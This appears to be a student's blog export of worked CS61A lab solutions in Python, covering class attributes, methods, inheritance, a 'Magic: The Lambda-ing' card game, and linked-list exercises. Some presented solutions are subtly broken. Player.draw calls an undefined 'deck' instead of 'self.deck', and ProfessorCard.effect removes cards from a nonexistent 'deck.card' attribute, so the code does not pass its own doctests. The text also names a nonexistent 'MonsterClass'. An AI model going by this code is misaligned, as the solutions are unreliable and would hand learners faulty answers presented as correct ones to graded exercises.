<h3 id="Dot-Notation"><a href="#Dot-Notation" class="headerlink" title="Dot Notation"></a>Dot Notation</h3><p>Class attributes can also be accessed using dot notation, both on an instance and on the class name itself. For example, we can access the class attribute <code>size</code> of <code>Car</code> like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; Car.size</span><br><span class="line">&#39;Tiny&#39;</span><br></pre></td></tr></table></figure>
<p>And in the following line, we access deneros_car’s color attribute:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; deneros_car.color</span><br><span class="line">&#39;No color yet. You need to paint me.&#39;</span><br></pre></td></tr></table></figure>
<p>Looks like we need to paint deneros_car!</p>
<h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><p>Let’s use the <code>paint</code> method from the <code>Car</code> class. Methods are functions that are specific to a class; only an instance of the class can use them. We’ve already seen one method: <code>__init__</code>! Think of methods as actions or abilities of objects. How do we call methods on an instance? You guessed it, dot notation!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; deneros_car.paint(&#39;black&#39;)</span><br><span class="line">&#39;Tesla Model S is now black&#39;</span><br><span class="line">&gt;&gt;&gt; deneros_car.color</span><br><span class="line">&#39;black&#39;</span><br></pre></td></tr></table></figure>
<p>Awesome! But if you take a look at the <code>paint</code> method, it takes two parameters. So why don’t we need to pass two arguments? Just like we’ve seen with <code>__init__</code>, all methods of a class have a <code>self</code> parameter to which Python automatically binds the instance that is calling that method. Here, <code>deneros_car</code> is bound to <code>self</code> so that the body of <code>paint</code> can access its attributes!</p>
<p>You can also call methods using the class name and dot notation; for example,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; Car.paint(deneros_car, &#39;red&#39;)</span><br><span class="line">&#39;Tesla Model S is now red&#39;</span><br></pre></td></tr></table></figure>
<p>Notice that unlike when we painted Professor DeNero’s car black, this time we had to pass in two arguments: one for <code>self</code> and one for <code>color</code>. This is because when you call a method using dot notation from an instance, Python knows what instance to automatically bind to <code>self</code>. However, when you call a method using dot notation from the class, Python doesn’t know which instance of <code>Car</code> we want to paint, so we have to pass that in as well.</p>
<h2 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h2><p>Professor DeNero’s red Tesla is pretty cool, but he wants a bigger car! How about we create a monster truck for him instead? In <code>car.py</code>, we’ve defined a <code>MonsterTruck</code> class. Let’s look at the code for <code>MonsterTruck</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MonsterTruck</span><span class="params">(Car)</span>:</span></span><br><span class="line">    size = <span class="string">'Monster'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rev</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Vroom! This Monster Truck is huge!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drive</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rev()</span><br><span class="line">        <span class="keyword">return</span> Car.drive(self)</span><br></pre></td></tr></table></figure>
<p>Wow! The truck may be big, but the source code is tiny! Let’s make sure that the truck still does what we expect it to do. Let’s create a new instance of Professor DeNero’s monster truck:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; deneros_truck &#x3D; MonsterTruck(&#39;Monster Truck&#39;, &#39;XXL&#39;)</span><br></pre></td></tr></table></figure>
<p>Does it behave as you would expect a <code>Car</code> to? Can you still paint it?<br>Is it even drivable?</p>
<p>Well, the class <code>MonsterTruck</code> is defined as <code>class MonsterTruck(Car)</code>:, meaning its superclass is <code>Car</code>. Likewise, the class <code>MonsterTruck</code> is a subclass of the<code>Car</code> class. That means the <code>MonsterTruck</code> class inherits all the attributes and methods that were defined in <code>Car</code>, including its constructor!</p>
<p><strong>Inheritance</strong> makes setting up a hierarchy of classes easier because the amount of code you need to write to define a new class of objects is reduced. You only need to add (or override) new attributes or methods that you want to be unique from those in the superclass.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; deneros_car.size</span><br><span class="line">&#39;Tiny&#39;</span><br><span class="line">&gt;&gt;&gt; deneros_truck.size</span><br><span class="line">&#39;Monster&#39;</span><br></pre></td></tr></table></figure>
<p>Wow, what a difference in size! This is because the class attribute <code>size</code> of <code>MonsterTruck</code> overrides the <code>size</code> class attribute of <code>Car</code>, so all <code>MonsterTruck</code> instances are ‘<code>Monster&#39;</code>-sized.</p>
<p>In addition, the <code>drive</code> method in <code>MonsterTruck</code> overrides the one in <code>Car</code>. To show off all <code>MonsterTruck</code> instances, we defined a <code>rev</code> method specific to <code>MonsterClass</code>. Regular <code>Cars</code> cannot <code>rev</code>! Everything else – the constructor <code>__init__</code>, <code>paint</code>, <code>num_wheels</code>, <code>gas</code> – are inherited from <code>Car</code>.</p>
<h1 id="Magic-The-lambda-ing"><a href="#Magic-The-lambda-ing" class="headerlink" title="Magic: The lambda-ing"></a>Magic: The lambda-ing</h1><p>In the next part of this lab, we will be implementing a card game!</p>
<p>You can start the game by typing:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cardgame.py</span><br></pre></td></tr></table></figure>
<p><strong>This game doesn’t work yet</strong>. If we run this right now, the code will error, since we haven’t implemented anything yet. When it’s working, you can exit the game and return to the command line with <code>Ctrl-C</code> or <code>Ctrl-D</code>.</p>
<p>This game uses several different files.</p>
<ul>
<li>Code for all the questions in this lab can be found in <code>classes.py</code>.<br>Some utility for the game can be found in <code>cardgame.py</code>, but you won’t need to open or read this file. This file doesn’t actually mutate any instances directly - instead, it calls methods of the different classes, maintaining a strict abstraction barrier.</li>
<li>If you want to modify your game later to add your own custom cards and decks, you can look in <code>cards.py</code> to see all the standard cards and the default deck; here, you can add more cards and change what decks you and your opponent use. The cards were not created with balance in mind, so feel free to modify the stats and add/remove cards as desired.</li>
</ul>
<p><strong>Rules of the Game</strong> This game is a little involved, though not nearly as much as its namesake. Here’s how it goes:</p>
<p>There are two players. Each player has a hand of cards and a deck, and at the start of each round, each player draws a card from their deck. If a player’s deck is empty when they try to draw, they will automatically lose the game. Cards have a name, an attack stat, and a defense stat. Each round, each player chooses one card to play from their own hands. The card with the higher power wins the round. Each played card’s power value is calculated as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(player card&#39;s attack) - (opponent card&#39;s defense) &#x2F; 2</span><br></pre></td></tr></table></figure>
<p>For example, let’s say Player 1 plays a card with 2000 ATK/1000 DEF and Player 2 plays a card with 1500 ATK/3000 DEF. Their cards’ powers are calculated as:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P1: 2000 - 3000&#x2F;2 &#x3D; 2000 - 1500 &#x3D; 500</span><br><span class="line">P2: 1500 - 1000&#x2F;2 &#x3D; 1500 - 500 &#x3D; 1000</span><br></pre></td></tr></table></figure>
<p>so Player 2 would win this round.</p>
<p>The first player to win 8 rounds wins the match!</p>
<p>However, there are a few effects we can add (in the optional questions section) to make this game a bit more interesting. Cards are split into Tutor, TA, and Professor types, and each type has a different effect when they’re played. All effects are applied before power is calculated during that round:</p>
<ul>
<li>A Tutor will cause the opponent to discard and re-draw the first 3 cards in their hand.</li>
<li>A TA will swap the opponent card’s attack and defense.</li>
<li>A Professor adds the opponent card’s attack and defense to all cards in their deck and then remove all cards in the opponent’s deck that share its attack or defense!<br>These are a lot of rules to remember, so refer back here if you need to review them, and let’s start making the game</li>
</ul>
<h2 id="Q3-Making-Cards"><a href="#Q3-Making-Cards" class="headerlink" title="Q3: Making Cards"></a>Q3: Making Cards</h2><p>To play a card game, we’re going to need to have cards, so let’s make some! We’re gonna implement the basics of the <code>Card</code> class first.</p>
<p>First, implement the <code>Card</code> class constructor in <code>classes.py</code>. This constructor takes three arguments:</p>
<ul>
<li>the <code>name</code> of the card, a string</li>
<li>the <code>attack</code> stat of the card, an integer</li>
<li>the <code>defense</code> stat of the card, an integer<br>Each <code>Card</code> instance should keep track of these values using instance attributes called <code>name</code>, <code>attack</code>, and <code>defense</code>.</li>
</ul>
<p>You should also implement the <code>power</code> method in <code>Card</code>, which takes in another card as an input and calculates the current card’s power. Check the Rules section if you want a refresher on how power is calculated.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Card</span><span class="params">(object)</span>:</span></span><br><span class="line">    cardtype = <span class="string">'Staff'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, attack, defense)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Create a Card object with a name, attack,</span></span><br><span class="line"><span class="string">        and defense.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member = Card('staff', 400, 300)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member.name</span></span><br><span class="line"><span class="string">        'staff'</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member.attack</span></span><br><span class="line"><span class="string">        400</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member.defense</span></span><br><span class="line"><span class="string">        300</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_staff = Card('other', 300, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_staff.attack</span></span><br><span class="line"><span class="string">        300</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_staff.defense</span></span><br><span class="line"><span class="string">        500</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.attack = attack</span><br><span class="line">        self.defense = defense</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">power</span><span class="params">(self, other_card)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Calculate power as:</span></span><br><span class="line"><span class="string">        (player card's attack) - (opponent card's defense)/2</span></span><br><span class="line"><span class="string">        where other_card is the opponent's card.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member = Card('staff', 400, 300)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_staff = Card('other', 300, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member.power(other_staff)</span></span><br><span class="line"><span class="string">        150.0</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_staff.power(staff_member)</span></span><br><span class="line"><span class="string">        150.0</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; third_card = Card('third', 200, 400)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; staff_member.power(third_card)</span></span><br><span class="line"><span class="string">        200.0</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; third_card.power(staff_member)</span></span><br><span class="line"><span class="string">        50.0</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        <span class="keyword">return</span> self.attack - (other_card.defense) / <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h2 id="Q4-Making-a-Player"><a href="#Q4-Making-a-Player" class="headerlink" title="Q4: Making a Player"></a>Q4: Making a Player</h2><p>Now that we have cards, we can make a deck, but we still need players to actually use them. We’ll now fill in the implementation of the <code>Player</code> class.<br>A <code>Player</code> instance has three instance attributes:</p>
<ul>
<li><code>name</code> is the player’s name. When you play the game, you can enter your name, which will be converted into a string to be passed to the constructor.</li>
<li><code>deck</code> is an instance of the <code>Deck</code> class. You can draw from it using its <code>.draw()</code> method.</li>
<li><code>hand</code> is a list of <code>Card</code> instances. Each player should start with 5 cards in their hand, drawn from their <code>deck</code>. Each card in the hand can be selected by its index in the list during the game. When a player draws a new card from the deck, it is added to the end of this list.<br>Complete the implementation of the constructor for <code>Player</code> so that <code>self.hand</code> is set to a list of 5 cards drawn from the player’s deck.</li>
</ul>
<p>Next, implement the <code>draw</code> and <code>play</code> methods in the <code>Player</code> class. The <code>draw</code> method draws a card from the deck and adds it to the player’s hand. The <code>play</code> method removes and returns a card from the player’s hand at the given index.</p>
<p>Call <code>deck.draw()</code> when implementing <code>Player.__init__</code> and <code>Player.draw</code>. Don’t worry about how this function works - leave it all to the abstraction!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, deck, name)</span>:</span></span><br><span class="line">        <span class="string">"""Initialize a Player object.</span></span><br><span class="line"><span class="string">        A Player starts the game by drawing 5 cards from their deck. Each turn, a Player draws another card from the deck and chooses one to play.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_card = Card('test', 100, 100)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_deck = Deck([test_card.copy() for _ in range(6)])</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player = Player(test_deck, 'tester')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(test_deck.cards)</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(test_player.hand)</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.deck = deck</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        self.hand = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            self.hand.append(deck.draw())</span><br><span class="line">        <span class="comment"># self.hand = [deck.draw() for _ in range(5)]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Draw a card from the player's deck and add it to their hand.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_card = Card('test', 100, 100)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_deck = Deck([test_card.copy() for _ in range(6)])</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player = Player(test_deck, 'tester')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player.draw()</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(test_deck.cards)</span></span><br><span class="line"><span class="string">        0</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(test_player.hand)</span></span><br><span class="line"><span class="string">        6</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.deck.is_empty(), <span class="string">'Deck is empty!'</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        self.hand.append(deck.draw())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">(self, card_index)</span>:</span></span><br><span class="line">        <span class="string">"""Remove and return a card from the player's hand at the given index.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; from cards import *</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player = Player(standard_deck, 'tester')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; ta1, ta2 = TACard("ta_1", 300, 400), TACard("ta_2", 500, 600)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; tutor1, tutor2 = TutorCard("t1", 200, 500), TutorCard("t2", 600, 400)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player.hand = [ta1, ta2, tutor1, tutor2]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player.play(0) is ta1</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_player.play(2) is tutor2</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(test_player.hand)</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        <span class="keyword">return</span> self.hand.pop(card_index)</span><br></pre></td></tr></table></figure>
<p>After you complete this problem, you’ll be able to play a working version of the game! Type</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cardgame.py</span><br></pre></td></tr></table></figure>
<p>to start a game of Magic: The Lambda-ing!</p>
<p>This version doesn’t have the effects for different cards, yet - to get those working, try out the optional questions below.</p>
<h1 id="Optional-Questions"><a href="#Optional-Questions" class="headerlink" title="Optional Questions"></a>Optional Questions</h1><p>For the following sections, do <strong>not</strong> overwrite any lines already provided in the code. Additionally, make sure to uncomment any calls to print once you have implemented each method. These are used to display information to the user, and changing them may cause you to fail tests that you would otherwise pass.</p>
<h2 id="Q5-Tutors-Flummox"><a href="#Q5-Tutors-Flummox" class="headerlink" title="Q5: Tutors: Flummox"></a>Q5: Tutors: Flummox</h2><p>To really make this card game interesting, our cards should have effects! We’ll do this with the <code>effect</code> function for cards, which takes in the opponent card, the current player, and the opponent player.</p>
<p>Implement the <code>effect</code> method for Tutors, which causes the opponent to discard the first 3 cards in their hand and then draw 3 new cards. Assume there at least 3 cards in the opponent’s hand and at least 3 cards in the opponent’s deck.</p>
<p>Remember to uncomment the call to <code>print</code> once you’re done!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TutorCard</span><span class="params">(Card)</span>:</span></span><br><span class="line">    cardtype = <span class="string">'Tutor'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">effect</span><span class="params">(self, other_card, player, opponent)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Discard the first 3 cards in the opponent's hand and have</span></span><br><span class="line"><span class="string">        them draw the same number of cards from their deck.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; from cards import *</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; player1, player2 = Player(player_deck, 'p1'), Player(opponent_deck, 'p2')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_card = Card('other', 500, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; tutor_test = TutorCard('Tutor', 500, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; initial_deck_length = len(player2.deck.cards)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; tutor_test.effect(other_card, player1, player2)</span></span><br><span class="line"><span class="string">        p2 discarded and re-drew 3 cards!</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(player2.hand)</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(player2.deck.cards) == initial_deck_length - 3</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        opponent.hand = opponent.hand[<span class="number">3</span>:]</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            opponent.draw()</span><br><span class="line">        <span class="comment">#Uncomment the line below when you've finished implementing this method!</span></span><br><span class="line">        print(<span class="string">'&#123;&#125; discarded and re-drew 3 cards!'</span>.format(opponent.name))</span><br></pre></td></tr></table></figure>

<h2 id="Q6-TAs-Shift"><a href="#Q6-TAs-Shift" class="headerlink" title="Q6: TAs: Shift"></a>Q6: TAs: Shift</h2><p>Let’s add an effect for TAs now! Implement the <code>effect</code> method for TAs, which swaps the attack and defense of the opponent’s card.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TACard</span><span class="params">(Card)</span>:</span></span><br><span class="line">    cardtype = <span class="string">'TA'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">effect</span><span class="params">(self, other_card, player, opponent)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Swap the attack and defense of an opponent's card.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; from cards import *</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; player1, player2 = Player(player_deck, 'p1'), Player(opponent_deck, 'p2')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_card = Card('other', 300, 600)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; ta_test = TACard('TA', 500, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; ta_test.effect(other_card, player1, player2)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_card.attack</span></span><br><span class="line"><span class="string">        600</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; other_card.defense</span></span><br><span class="line"><span class="string">        300</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        temp = other_card.attack</span><br><span class="line">        other_card.attack = other_card.defense</span><br><span class="line">        other_card.defense = temp</span><br><span class="line">        <span class="comment"># other_card.attack, other_card.defense = other_card.defense, other_card.attack</span></span><br></pre></td></tr></table></figure>
<h2 id="Q7-The-Professor-Arrives"><a href="#Q7-The-Professor-Arrives" class="headerlink" title="Q7: The Professor Arrives"></a>Q7: The Professor Arrives</h2><p>A new challenger has appeared! Implement the <code>effect</code> method for the Professor, who adds the opponent card’s attack and defense to all cards in the player’s deck and then removes all cards in the opponent’s deck that have the same attack or defense as the opponent’s card.<br>Note: You might run into trouble when you mutate a list as you’re iterating through it. Try iterating through a copy instead! You can use slicing to copy a list:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; lst &#x3D; [1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; copy &#x3D; lst[:]</span><br><span class="line">&gt;&gt;&gt; copy</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; copy is lst</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfessorCard</span><span class="params">(Card)</span>:</span></span><br><span class="line">    cardtype = <span class="string">'Professor'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">effect</span><span class="params">(self, other_card, player, opponent)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Adds the attack and defense of the opponent's card to</span></span><br><span class="line"><span class="string">        all cards in the player's deck, then removes all cards</span></span><br><span class="line"><span class="string">        in the opponent's deck that share an attack or defense</span></span><br><span class="line"><span class="string">        stat with the opponent's card.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_card = Card('card', 300, 300)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; professor_test = ProfessorCard('Professor', 500, 500)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; opponent_card = test_card.copy()</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; test_deck = Deck([test_card.copy() for _ in range(8)])</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; player1, player2 = Player(test_deck.copy(), 'p1'), Player(test_deck.copy(), 'p2')</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; professor_test.effect(opponent_card, player1, player2)</span></span><br><span class="line"><span class="string">        3 cards were discarded from p2's deck!</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; [(card.attack, card.defense) for card in player1.deck.cards]</span></span><br><span class="line"><span class="string">        [(600, 600), (600, 600), (600, 600)]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; len(player2.deck.cards)</span></span><br><span class="line"><span class="string">        0</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        orig_opponent_deck_length = len(opponent.deck.cards)</span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        <span class="keyword">for</span> card <span class="keyword">in</span> player.deck.cards:</span><br><span class="line">            card.attack += other_card.attack</span><br><span class="line">            card.defense += other_card.defense</span><br><span class="line">        <span class="keyword">for</span> card <span class="keyword">in</span> opponent.deck.cards[:]:</span><br><span class="line">            <span class="keyword">if</span> card.attack == other_card.attack <span class="keyword">or</span> card.defense == other_card.defense:</span><br><span class="line">                opponent.deck.card.remove(card)</span><br><span class="line">        discarded = orig_opponent_deck_length - len(opponent.deck.cards)</span><br><span class="line">        <span class="keyword">if</span> discarded:</span><br><span class="line">            <span class="comment">#Uncomment the line below when you've finished implementing this method!</span></span><br><span class="line">            print(<span class="string">'&#123;&#125; cards were discarded from &#123;&#125;\'s deck!'</span>.format(discarded, opponent.name))</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>After you complete this problem, we’ll have a fully functional game of Magic: The Lambda-ing! This doesn’t have to be the end, though - we encourage you to get creative with more card types, effects, and even adding more custom cards to your deck!</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab07</title>
    <url>/2018/10/24/cs61a-lab07/</url>
    <content><![CDATA[<h1 id="Check-Off"><a href="#Check-Off" class="headerlink" title="Check-Off"></a>Check-Off</h1><h2 id="Q1-A-Okay"><a href="#Q1-A-Okay" class="headerlink" title="Q1: A-Okay"></a>Q1: A-Okay</h2><p>Sign up for checkoffs in your lab if you’d like to get credit for this week’s checkoff.<br>What happens in the following code? Make sure you can explain why each line works or breaks.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...    y &#x3D; 1</span><br><span class="line">...    def __init__(self, y):</span><br><span class="line">...        self.y &#x3D; y</span><br><span class="line">...    def f(self, x):</span><br><span class="line">...        self.y +&#x3D; x</span><br><span class="line">...  </span><br><span class="line">&gt;&gt;&gt; a &#x3D; A(0) # Ok or not okay?</span><br><span class="line">&gt;&gt;&gt; a.f(6)   # Ok or not okay?</span><br><span class="line">&gt;&gt;&gt; a.f(A, 9) # Ok or not okay?</span><br><span class="line">&gt;&gt;&gt; A.f(a, 4) # Ok or not okay?</span><br><span class="line">&gt;&gt;&gt; A.f(A, 4) # Ok or not okay?</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="Coding-Practice"><a href="#Coding-Practice" class="headerlink" title="Coding Practice"></a>Coding Practice</h1><h2 id="Q4-Link-to-List"><a href="#Q4-Link-to-List" class="headerlink" title="Q4: Link to List"></a>Q4: Link to List</h2><p>Write a function <code>link_to_list</code> that takes in a linked list and returns the sequence as a Python list. You may assume that the input list is shallow; none of the elements is another linked list.</p>
<p>Try to find both an iterative and recursive solution for this problem!<br><span style="color:red">Iterative solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_to_list</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""Takes a linked list and returns a Python list with the same elements.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link = Link(1, Link(2, Link(3, Link(4))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link_to_list(link)</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link_to_list(Link.empty)</span></span><br><span class="line"><span class="string">    []</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    lst = []</span><br><span class="line">    <span class="keyword">while</span> link != Link.empty:</span><br><span class="line">      lst.append(link.first)</span><br><span class="line">      link = link.rest</span><br><span class="line">    <span class="keyword">return</span> lst</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Recursive solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_to_list</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""Takes a linked list and returns a Python list with the same elements.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link = Link(1, Link(2, Link(3, Link(4))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link_to_list(link)</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link_to_list(Link.empty)</span></span><br><span class="line"><span class="string">    []</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> link == Link.empty:</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> [link.first] + link_to_list(link.rest)</span><br></pre></td></tr></table></figure>
<h2 id="Q5-Store-Digits"><a href="#Q5-Store-Digits" class="headerlink" title="Q5: Store Digits"></a>Q5: Store Digits</h2><p>Write a function <code>store_digits</code> that takes in an integer <code>n</code> and returns a linked list where each element of the list is a digit of <code>n</code>.</p>
